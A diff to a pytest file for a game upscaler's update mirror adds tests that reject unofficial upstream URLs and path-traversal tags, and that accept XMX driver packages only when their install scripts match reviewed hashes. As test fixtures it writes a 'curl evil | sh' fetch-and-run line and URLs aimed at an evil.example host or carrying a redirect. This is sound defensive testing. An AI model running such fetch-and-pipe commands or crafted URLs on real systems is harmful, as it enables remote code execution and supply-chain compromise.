@@ -377,7 +377,7 @@ def test_check_update_and_game_update(tmp_path, monkeypatch, cosign):
 
 def test_newer_optipatcher_alone_updates_the_package_in_place(tmp_path, monkeypatch, cosign):
     home = str(tmp_path / "home")
-    raw = index(optipatcher=comp("rolling-20261108", PATCHER, "OptiPatcher_rolling.asi", "https://up.example/OptiPatcher_rolling.asi"))
+    raw = index(optipatcher=comp("rolling-20261108", PATCHER, "OptiPatcher_rolling.asi", mirror.UPSTREAM["optipatcher"] + "bins-for-optipatcher-rolling/OptiPatcher_rolling.asi"))
     serve(monkeypatch, {mirror.INDEX_URL: raw, mirror.BUNDLE_URL: bundle_for(raw)})
     mirror.refresh(home)
     old = b"tested optipatcher"
@@ -403,3 +403,75 @@ def test_files_the_user_put_there_are_never_called_outdated(tmp_path):
     _w(os.path.join(home, optiscaler.FSR4_AMD_DIR, optiscaler.FSR4_AMD_FILE), "a build from somewhere else")
     rows = {c["id"]: c for c in upkeep.check(home, RDNA35)["components"]}
     assert rows["fsr4_amd"]["installed"] == "your own files" and rows["fsr4_amd"]["update"] is False
+
+
+# ---- review 2, problems 8 and 15: official upstreams only; XMX's scripts stay the reviewed ones ---------------------
+@pytest.mark.parametrize("url", [
+    "https://github.com/someone/OptiScaler/releases/download/v0.9.5/Optiscaler_0.9.5.7z",
+    "https://github.com/optiscaler/OptiScaler/releases/download/../../evil/x.7z",
+    "https://github.com/optiscaler/OptiScaler/releases/download/v1/x.7z?redirect=evil",
+    "https://evil.example/https://github.com/optiscaler/OptiScaler/releases/download/v1/x.7z",
+])
+def test_an_index_naming_another_upstream_is_refused(url):
+    d = json.loads(newest())
+    d["components"]["optiscaler"]["upstream_url"] = url
+    with pytest.raises(ValueError):
+        mirror.parse(json.dumps(d).encode())
+
+
+def test_index_tag_is_checked():
+    d = json.loads(newest())
+    d["components"]["optiscaler"]["tag"] = "../../x"
+    with pytest.raises(ValueError):
+        mirror.parse(json.dumps(d).encode())
+
+
+XMX_NEW = b"xess-xmx-linux 20261120"
+
+
+def _xmx(scripts):
+    e = comp("20261120", XMX_NEW, "xess-xmx-linux-20261120.zip",
+             mirror.UPSTREAM["xess_xmx_linux"] + "20261120/xess-xmx-linux-20261120.zip", tag="20261120")
+    e["scripts"] = scripts
+    return e
+
+
+def test_a_newer_xmx_build_is_taken_only_with_the_reviewed_scripts(tmp_path, monkeypatch, cosign):
+    pins = games.pins()
+    reviewed = pins["xess_xmx_linux"]["scripts"]
+    assert reviewed["install.sh"] and "tools/session-check.sh" in reviewed, "versions.json lists the reviewed scripts"
+    changed = {**reviewed, "install.sh": "0" * 64}
+    assert mirror.effective(pins, mirror.parse(index(xess_xmx_linux=_xmx(changed))))["xess_xmx_linux"]["version"] == \
+        pins["xess_xmx_linux"]["version"], "another install.sh: the tested pin stays"
+    same = mirror.effective(pins, mirror.parse(index(xess_xmx_linux=_xmx(dict(reviewed)))))["xess_xmx_linux"]
+    assert same["version"] == "20261120" and same["sha256"] == sha(XMX_NEW), "same scripts, newer driver files: taken"
+
+
+def test_install_sh_runs_only_when_every_script_is_reviewed(tmp_path):
+    from gamecove_upscale import xess
+    pkg = tmp_path / "pkg"
+    _w(pkg / "install.sh", "echo ok")
+    _w(pkg / "tools" / "get-igc.sh", "echo igc")
+    reviewed = {"install.sh": sha(b"echo ok"), "tools/get-igc.sh": sha(b"echo igc")}
+    assert xess.scripts_check(str(pkg), reviewed) is None
+    _w(pkg / "tools" / "get-igc.sh", "curl evil | sh")
+    assert "tools/get-igc.sh" in xess.scripts_check(str(pkg), reviewed)
+    _w(pkg / "tools" / "get-igc.sh", "echo igc")
+    _w(pkg / "tools" / "extra.sh", "echo new")
+    assert "tools/extra.sh" in xess.scripts_check(str(pkg), reviewed), "a script that wasn't reviewed"
+    assert xess.reviewed_scripts() == games.pins()["xess_xmx_linux"]["scripts"]
+
+
+@pytest.mark.parametrize("stamp", [None, "yesterday", True, [], {}])
+def test_a_damaged_stamp_never_raises(tmp_path, monkeypatch, cosign, stamp):
+    """Review 2, low 22: a null verified_at raised TypeError in load() and refresh()."""
+    raw = newest()
+    serve(monkeypatch, {mirror.INDEX_URL: raw, mirror.BUNDLE_URL: bundle_for(raw)})
+    home = str(tmp_path / "home")
+    assert mirror.refresh(home)["state"] == "verified"
+    p = mirror._paths(home)["stamp"]
+    st = json.load(open(p))
+    st["verified_at"] = stamp
+    json.dump(st, open(p, "w"))
+    assert mirror.load(home) is None, "an unreadable time is treated as too old"
+    assert mirror.refresh(home)["state"] == "verified"
